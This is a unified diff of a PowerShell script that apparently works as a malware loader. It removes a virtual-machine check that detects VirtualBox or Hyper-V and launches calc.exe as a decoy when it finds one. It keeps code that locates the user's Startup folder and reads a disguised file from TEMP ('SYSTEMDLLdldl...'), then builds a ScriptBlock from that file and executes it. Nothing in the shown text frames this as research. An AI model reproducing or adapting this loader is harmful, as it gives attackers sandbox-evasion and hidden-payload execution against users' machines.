@@ -1,13 +1,4 @@
-$A = (Get-Process | Select-String -Pattern vboxservice).count
-If ($A -GT 0) { $Virtual = $True} Else {$Virtual = $False}
-
-$B = Get-WmiObject -Q “Select Model From Win32_ComputerSystem”
-If ($B.Model -eq “Virtual Machine”) {$Virtual1 = $True} Else {$Virtual1 = $False}
-
-
-
-if ($virtual -eq $false -and $virtual1 -eq $false){
-    $temp = $env:TEMP;
+$temp = $env:TEMP;
 $userprof = $env:USERPROFILE;
 $startUpFolder = "$userprof\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup";
 
@@ -26,6 +17,4 @@ $AnyFile = Get-Content $temp\SYSTEMDLLdldldldldldldldldldldldldldldldldldldldldl
     $ScriptBlock = [System.Management.Automation.ScriptBlock]::Create($AnyFile)
 
     & $ScriptBlock
-}else {
-    Start-Process calc.exe
-}
+
